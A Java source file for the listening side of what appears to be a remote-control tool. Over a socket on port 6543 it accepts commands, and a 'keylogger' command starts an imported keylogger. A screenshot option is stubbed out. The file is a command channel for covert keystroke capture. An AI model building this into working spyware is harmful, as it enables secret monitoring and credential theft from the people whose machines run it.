package Server;

import Function.KeyLogger;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

public class Server {
    public static void main(String[] args) throws Exception {
        String option;
        String data;

        BufferedReader inFromUser =
                new BufferedReader(new InputStreamReader(System.in));
        Socket connectionSocket;
        try (ServerSocket welcomeSocket = new ServerSocket(6543)) {
            connectionSocket = welcomeSocket.accept();
        }
        


        DataOutputStream outToServer =
                new DataOutputStream(connectionSocket.getOutputStream());


        BufferedReader inFromServer =
                new BufferedReader(new
                        InputStreamReader(connectionSocket.getInputStream()));
        do {
            option = receiveMess(connectionSocket);
            System.out.println("Client: " + option);
            switch (option) {
                case "keylogger":
                    KeyLogger.main();
                    break;//do option
                case "screenshot":
                    //Screenshot.main();
                    break;
            }


            sendMess(connectionSocket, "done");


        } while (!option.equals("exit"));
        connectionSocket.close();
    }

    public static String dequeue(StringBuilder dataQueue) {
        String temp = new String(dataQueue);
        int pos = temp.lastIndexOf('<');
        temp = temp.substring(0, pos);

        pos = temp.lastIndexOf('>');
        temp = temp.substring(pos + 1);
        return temp;
    }

    public static void sendMess(Socket connect, String mess) {

        try {
            DataOutputStream toServer = new DataOutputStream(connect.getOutputStream());
            String temp = "<mess>" + mess + "</mess>";
            toServer.writeBytes(temp);

        } catch (Exception e) {
            System.out.println(("Error " + e));
        }

    }

    public static String receiveMess(Socket connect) {
        StringBuilder dataQueue = new StringBuilder();
        try {
            byte[] chunk = new byte[1024];

            int dataSize;
            DataInputStream fromClient = new DataInputStream(connect.getInputStream());
            do {
                dataSize = fromClient.read(chunk, 0, 1024);
                String temp = new String(chunk);
                dataQueue.append(temp);
            } while (dataSize >= 1024);


        } catch (Exception e) {
            System.out.println(("Error " + e));
        }
        return dequeue(dataQueue);
    }
}